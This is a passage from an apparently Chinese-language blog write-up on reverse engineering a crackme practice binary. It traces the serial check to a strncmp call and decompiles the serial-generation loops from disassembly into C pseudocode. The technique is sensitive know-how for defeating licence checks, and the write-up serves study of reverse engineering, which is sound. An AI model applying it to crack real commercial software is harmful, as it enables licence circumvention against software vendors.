&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">cmp&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp-0Ch&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="nf">jnz&lt;/span> &lt;span class="no">...&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这次是比较用户名长度和0，非0跳转。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-11.png"
loading="lazy"
alt="image-20210914224625891"
>&lt;/p>
&lt;p>可以看到为零时，经过一个未知函数 &lt;code>sub_4036FC(var_8)&lt;/code> 后，跳回开头。&lt;/p>
&lt;p>继续看正确流程，&lt;code>jmp $+5&lt;/code> ，&lt;code>$&lt;/code> 表示当前正在执行的代码在代码段内的偏移量，+5就是从当前代码开始往后跳过5个字节，我们直接看IDA分析好的跳转位置。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-12.png"
loading="lazy"
alt="image-20210914225052452"
>&lt;/p>
&lt;p>又是非常熟悉的代码，和读取 &lt;code>username&lt;/code> 的分析方式相同，以相同的顺序调用相同的函数，可以得到&lt;code>var_14&lt;/code>是&lt;code>serial_len&lt;/code>，&lt;code>Str1&lt;/code>可能是&lt;code>serial&lt;/code>字符串指针。不做重复分析，继续往下看。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-13.png"
loading="lazy"
alt="image-20210914225322787"
>&lt;/p>
&lt;p>右边的代码块是关于长度的判断，分析方法不再重复。左侧代码就是我们的关键跳转了，其中出现两个函数调用。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="no">var_C&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="no">Block&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">esp&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="no">Ch&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="no">Ix&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">ecx&lt;/span> &lt;span class="c">; void *
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">esp&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="no">Ch&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="no">Str2&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; size_t
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">call&lt;/span> &lt;span class="no">sub_401250&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="no">var_1C&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>var_c&lt;/code>先前被判断是&lt;code>username_len&lt;/code>，&lt;code>Block&lt;/code>就是&lt;code>var_8&lt;/code>，先前被怀疑是用户键入的用户名字符串指针。未知函数的返回值保存在 &lt;code>[ebp-1ch]&lt;/code>中。&lt;/p>
&lt;p>这个&lt;code>1c&lt;/code>在随后的代码中立刻被用到。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="no">var_1C&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="no">Str1&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">esp&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="no">Ch&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="no">Ix&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">ecx&lt;/span> &lt;span class="c">; Str1
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">esp&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="no">Ch&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="no">Str2&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; Str2
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">esp&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="no">Ch&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="no">MaxCount&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="no">h&lt;/span> &lt;span class="c">; MaxCount
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">call&lt;/span> &lt;span class="no">_strncmp&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="no">var_20&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>Str1&lt;/code>在&lt;code>serial&lt;/code>输入这一步被怀疑是用户输入的序列号字符串指针，它和上一个函数调用返回的&lt;code>var_1c&lt;/code>被作为参数传递给&lt;code>strncmp&lt;/code>，字符串长度最大16字节。由此可见，&lt;code>var_1c&lt;/code>基本可以确定是正确序列号的指针，之前的未知函数可能就是生成序列号的函数。&lt;/p>
&lt;p>下一步分析序列号生成函数。&lt;/p>
&lt;h3 id="32-生成序列号">3.2 生成序列号&lt;/h3>
&lt;p>先看下控制流全览，能依稀分辨出三个循环。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-14.png"
loading="lazy"
alt="generate"
>&lt;/p>
&lt;p>自动分析出的变量表&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="c">; var uint32_t var_1ch @ ebp-0x1c
&lt;/span>&lt;span class="c">; var int32_t var_18h @ ebp-0x18
&lt;/span>&lt;span class="c">; var int32_t var_14h @ ebp-0x14
&lt;/span>&lt;span class="c">; var uint32_t var_10h @ ebp-0x10
&lt;/span>&lt;span class="c">; var uint32_t var_ch @ ebp-0xc
&lt;/span>&lt;span class="c">; var int32_t var_8h @ ebp-0x8
&lt;/span>&lt;span class="c">; var int32_t var_4h @ ebp-0x4
&lt;/span>&lt;span class="c">; arg uint32_t arg_8h @ ebp+0x8
&lt;/span>&lt;span class="c">; arg int32_t arg_ch @ ebp+0xc
&lt;/span>&lt;span class="c">; var int32_t var_sp_4h @ esp+0x4
&lt;/span>&lt;span class="c">; var int32_t var_sp_8h @ esp+0x8
&lt;/span>&lt;span class="c">; var int32_t var_sp_ch @ esp+0xc
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>先看循环外的代码，简单按用途划一下分隔线。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="err">0&lt;/span>&lt;span class="nf">x004071f0&lt;/span> &lt;span class="no">push&lt;/span> &lt;span class="no">ebp&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x004071f1&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">ebp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">esp&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x004071f3&lt;/span> &lt;span class="no">sub&lt;/span> &lt;span class="no">esp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0x2c&lt;/span>
&lt;span class="c">; ---
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="err">0&lt;/span>&lt;span class="nf">x004071f6&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">arg_ch&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x004071f9&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">arg_8h&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="c">; ---
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="err">0&lt;/span>&lt;span class="nf">x004071fc&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_4h&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mi">8&lt;/span>
&lt;span class="c">; ---
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="err">0&lt;/span>&lt;span class="nf">x00407203&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">esp&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mi">8&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x0040720a&lt;/span> &lt;span class="no">call&lt;/span> &lt;span class="no">fcn.00401302&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x0040720f&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_8h&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;span class="c">; ---
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="err">0&lt;/span>&lt;span class="nf">x00407212&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_ch&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>开头是惯例的两句栈帧准备动作，随后开辟 0x2c 大小的栈空间。&lt;/p>
&lt;p>两个没用的 &lt;code>mov eax,...&lt;/code>，之后是&lt;code>[ebp-4h]&lt;/code>设置为8，再把8作为参数调用了一个未知函数，返回值赋值给&lt;code>[ebp-8h]&lt;/code>，再初始化&lt;code>[ebp-ch]&lt;/code>为 0。伪代码表示就是下面这样。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">int&lt;/span> &lt;span class="n">var_4h&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">var_8h&lt;/span>&lt;span class="err">，&lt;/span> &lt;span class="n">var_ch&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// ebp-4h, ebp-8h, ebp-ch
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">var_4h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">var_8h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">unknown_func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x8&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">var_ch&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后是一个条件跳转。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="err">0&lt;/span>&lt;span class="nf">x00407219&lt;/span> &lt;span class="no">cmp&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_ch&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mi">8&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x0040721d&lt;/span> &lt;span class="no">jae&lt;/span> &lt;span class="mi">0x407242&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>学习下&lt;code>jae&lt;/code>指令。&lt;code>jae&lt;/code>指令和&lt;code>jnc&lt;/code>指令相同，&lt;code>CF=0&lt;/code>则跳转。&lt;code>jae&lt;/code> 可以看作 &lt;em>Jump if above or equals&lt;/em>。上一句 &lt;code>cmp&lt;/code> 计算 &lt;code>var_ch - 0x8&lt;/code> ，对相关标志位赋值。&lt;code>jae&lt;/code>指令根据&lt;code>CF&lt;/code>标志位判断，由于&lt;code>cmp&lt;/code>指令是减法，所以判断的是减法中有没有出现 &lt;em>借位&lt;/em> 。&lt;/p>
&lt;p>简单的描述就是，&lt;code>cmp ax, bx&lt;/code>，如果&lt;code>ax &amp;lt; bx&lt;/code> 则 &lt;code>CF=1&lt;/code>，如果 &lt;code>ax &amp;gt;= bx&lt;/code> 则 &lt;code>CF=0&lt;/code>。&lt;/p>
&lt;p>因为我们知道 &lt;code>var_ch&lt;/code> 刚被初始化成了0，不成立，继续看不成立的分支。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="err">0&lt;/span>&lt;span class="nf">x00407223&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_ch&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x00407226&lt;/span> &lt;span class="no">add&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0x52&lt;/span> &lt;span class="c">; 82
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="mi">0x00407229&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">dl&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">al&lt;/span>
&lt;span class="c">; ---
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="err">0&lt;/span>&lt;span class="nf">x0040722b&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_8h&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x0040722e&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_ch&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x00407231&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">byte&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span> &lt;span class="err">+&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">dl&lt;/span>
&lt;span class="c">; ---
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="err">0&lt;/span>&lt;span class="nf">x00407234&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_ch&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x00407237&lt;/span> &lt;span class="no">add&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x0040723a&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_ch&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x0040723d&lt;/span> &lt;span class="no">jmp&lt;/span> &lt;span class="mi">0x407219&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>把&lt;code>var_ch&lt;/code>移入寄存器&lt;code>eax&lt;/code>后，加上&lt;code>0x52&lt;/code>，又移动&lt;code>al&lt;/code>到&lt;code>dl&lt;/code>。后续&lt;code>eax&lt;/code>被用作别的用途，这一番操作其实就是给&lt;code>dl&lt;/code>赋值了一个&lt;code>(int16_t)0x52+var_ch&lt;/code>。&lt;/p>
&lt;p>随后把&lt;code>var_8h&lt;/code>和&lt;code>var_ch&lt;/code>相加后的地址赋值 &lt;code>dl&lt;/code>，也就是&lt;code>0x52&lt;/code>。&lt;/p>
&lt;p>接着&lt;code>var_ch&lt;/code>自增1，跳回 &lt;code>jae&lt;/code>判断前的 &lt;code>cmp&lt;/code>，形成循环，我们用伪代码表示。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">int&lt;/span> &lt;span class="n">var_4h&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">var_8h&lt;/span>&lt;span class="err">，&lt;/span> &lt;span class="n">var_ch&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// ebp-4h, ebp-8h, ebp-ch
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">var_4h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">var_8h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">unknown_func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x8&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">var_ch&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">var_ch&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">var_8h&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">var_ch&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x52&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">var_ch&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">var_ch&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>从结构上看，是一个典型的 for 循环。 &lt;code>var_8h&lt;/code> 是一个未知函数返回的指针。我们稍微改下伪代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">int&lt;/span> &lt;span class="n">var_4h&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">var_8h&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// ebp-4h, ebp-8h
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">var_4h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">var_8h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">unknown_func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x8&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">var_ch&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">var_ch&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">var_ch&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="c1">// var_ch -&amp;gt; ebp-ch
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">var_8h&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">var_ch&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x52&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">var_ch&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>接着继续看循环结束后的代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="err">0&lt;/span>&lt;span class="nf">x00407242&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">arg_ch&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; ebp+ch 函数右往左数第二个入参
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="mi">0x00407245&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">arg_8h&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; ebp+8h 函数右往左数第一个入参
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="mi">0x00407248&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">edx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_8h&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; ebp-8h
&lt;/span>&lt;span class="c">; ---
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="mi">0x0040724b&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">esp&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">edx&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x0040724e&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_sp_4h&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mi">8&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x00407256&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_sp_8h&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">ecx&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x0040725a&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_sp_ch&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x0040725e&lt;/span> &lt;span class="no">call&lt;/span> &lt;span class="no">fcn.00407310&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x00407263&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_10h&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>从之前分析主循环的代码，我们可以发现 &lt;code>arg_8h&lt;/code> 其实是用户名字符串指针，&lt;code>arg_ch&lt;/code>是用户名字符串长度。&lt;/p>
&lt;p>接着这两个入参，和 &lt;code>var_8h&lt;/code>，也就是之前得到指针，传入一个未知函数，随后再初始化了一个变量 &lt;code>var_10h&lt;/code>。&lt;/p>
&lt;p>伪代码如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="n">unknown_func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">var_8h&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">username&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">username_len&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 猜测的函数签名 func(void*, int, void*, int)
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">var_10h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>接着又是一个条件跳转。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="err">0&lt;/span>&lt;span class="nf">x0040726a&lt;/span> &lt;span class="no">cmp&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_10h&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mi">8&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x0040726e&lt;/span> &lt;span class="no">jae&lt;/span> &lt;span class="mi">0x407292&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>和先前的循环相同，不作重复分析，直接进入循环体。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="err">0&lt;/span>&lt;span class="nf">x00407274&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_8h&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x00407277&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_10h&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x0040727a&lt;/span> &lt;span class="no">movsx&lt;/span> &lt;span class="no">edx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">byte&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span> &lt;span class="err">+&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x0040727e&lt;/span> &lt;span class="no">xor&lt;/span> &lt;span class="no">edx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0x25&lt;/span> &lt;span class="c">; 37
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="mi">0x00407281&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">byte&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span> &lt;span class="err">+&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">dl&lt;/span>
&lt;span class="c">; ---
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="err">0&lt;/span>&lt;span class="nf">x00407284&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_10h&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x00407287&lt;/span> &lt;span class="no">add&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x0040728a&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_10h&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;span class="c">; ---
